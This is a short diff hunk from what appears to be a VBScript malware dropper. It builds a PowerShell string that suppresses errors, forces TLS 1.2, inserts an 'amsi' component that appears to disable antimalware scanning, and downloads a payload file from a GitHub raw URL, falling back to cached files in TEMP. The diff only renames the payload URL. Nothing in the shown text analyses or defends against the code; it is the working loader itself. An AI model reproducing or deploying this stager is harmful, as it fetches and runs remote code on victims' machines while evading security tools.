@@ -579,7 +579,7 @@ Dim ps, finalCmd
 ps = "$ErrorActionPreference='SilentlyContinue';" & _
      "if ([Enum]::GetNames([Net.SecurityProtocolType]) -contains 'Tls12') { [Net.ServicePointManager]::SecurityProtocol = 3072 };" & _
      amsi & _
-     "$u='https://raw.githubusercontent.com/lumen771/fff/refs/heads/main/pay.txt';" & _
+     "$u='https://raw.githubusercontent.com/lumen771/fff/refs/heads/main/payload_paonajcp.txt';" & _
      "$b='';try{$b=(iwr -Uri $u -UseBasicParsing -TimeoutSec 20).Content}catch{};" & _
      "if(!$b){$t1='$env:TEMP\a.txt';if(Test-Path $t1){$b=gc $t1 -Raw}};" & _
      "if(!$b){$t2='$env:TEMP\b.txt';if(Test-Path $t2){$b=gc $t2 -Raw}};" & _
